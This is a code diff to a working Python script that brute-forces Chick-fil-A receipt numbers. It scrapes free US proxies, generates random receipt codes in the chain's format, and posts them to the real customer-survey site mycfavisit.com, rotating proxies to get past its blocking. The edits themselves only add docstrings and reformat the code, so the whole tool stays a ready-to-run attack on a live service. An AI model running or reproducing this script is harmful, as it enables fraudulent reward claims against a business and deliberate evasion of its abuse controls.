@@ -1,12 +1,15 @@
+#!/usr/bin/env python3
+"""Bruteforcing Chick-fil-A Receipt Numbers."""
+
 import datetime
 import random
 import re
+
 import requests
-import selenium
-import time
 from requests import session
 
 US_PROXIES = 'https://www.us-proxy.org/'
+
 
 def main():
     while True:
@@ -18,11 +21,11 @@ def main():
             if check_proxy(formatted_proxy):
                 working_list.append(formatted_proxy)
         print('# of Working Proxies in List: ' + str(len(working_list)))
-        
+
         for x in working_list:
             print('Current Proxy: ' + x)
             while True:
-                proxy = {'http':x}
+                proxy = {'http': x}
                 code = code_gen()
                 try:
                     if check_code(code, proxy):
@@ -35,11 +38,15 @@ def main():
 
 
 def get_proxy_list():
+    """
+    Gets list of valid US proxies.
+    @return (dict): Dictionary of US proxies available.
+    """
     data = requests.get(US_PROXIES).text
     data_sect = data.split('<td>')
     proxy_port = []
     for x in data_sect:
-        x = x.replace('</td>','')
+        x = x.replace('</td>', '')
         results = re.search('[a-zA-Z]', x)
         if results is None:
             proxy_port.append(x)
@@ -47,12 +54,17 @@ def get_proxy_list():
     count = 0
     for x in proxy_port:
         if count % 2 == 0:
-            proxy_list[x] = proxy_port[count+1]
+            proxy_list[x] = proxy_port[count + 1]
         count = count + 1
     return proxy_list
 
 
 def check_proxy(proxy):
+    """
+    Checks if a proxy is valid.
+    @param (dict) proxy: Proxy we wish to test.
+    @return (bool): True if proxy is valid/available, False otherwise.
+    """
     try:
         requests.get('https://api.ipify.org', proxies={'http': proxy}, timeout=10).text
         return True
@@ -61,25 +73,36 @@ def check_proxy(proxy):
 
 
 def code_gen():
+    """
+    Generates a random receipt code.
+    @return (list): List containing all parts of a receipt code.
+    """
     orderNum = str(random.randint(0, 999)).zfill(3)
     digFive = str(random.randint(1, 3))
     registerNum = "5"
     firstSeven = orderNum + "0" + digFive + "0" + registerNum
     storeNum = "01336"
     hour = str(random.randint(7, 21)).zfill(2)
-    minute = str(random.randint(0 ,59)).zfill(2)
-    time =  hour + minute
+    minute = str(random.randint(0, 59)).zfill(2)
+    time = hour + minute
     curMon = str(datetime.date.today().strftime("%m"))
     curDay = str(datetime.date.today().strftime("%d"))
     date = curMon + curDay
     year = "9"
-    digSeven = str(random.randint(0,9))
+    digSeven = str(random.randint(0, 9))
     lastTwo = year + digSeven
     result = [firstSeven, storeNum, time, date, lastTwo]
     return result
 
 
 def check_code(code, proxy):
+    """
+    Checks whether generated receipt code is valid.
+    @param (list) code: List of all parts of a receipt code.
+    @param (dict) proxy: Proxy we wish to use for checking code.
+    @return (bool): True if code is valid, False otherwise.
+    @raise (Exception): Raised when script encounters Block page.
+    """
     s = session()
     c_result = s.get('https://www.mycfavisit.com/', timeout=10, proxies=proxy).text
     c_result = c_result.split('\n')
@@ -88,7 +111,8 @@ def check_code(code, proxy):
         if 'Survey.aspx?c=' in r:
             c = r.split('c=')[1].split('"')[0]
             break
-    payload = {'JavaScriptEnabled':'1', 'FIP':'True', 'CN1':code[0], 'CN2':code[1], 'CN3':code[2], 'CN4':code[3], 'CN5':code[4], 'NextButton':'Start', 'AllowCapture':''}
+    payload = {'JavaScriptEnabled': '1', 'FIP': 'True', 'CN1': code[0], 'CN2': code[1], 'CN3': code[2], 'CN4': code[3], 'CN5': code[4], 'NextButton': 'Start',
+               'AllowCapture': ''}
     request_url = 'https://www.mycfavisit.com/Survey.aspx?c=' + c
     response = s.post(request_url, data=payload, timeout=10, proxies=proxy).text
     if 'Sorry, we are unable to continue the survey based on the information you provided.' in response:
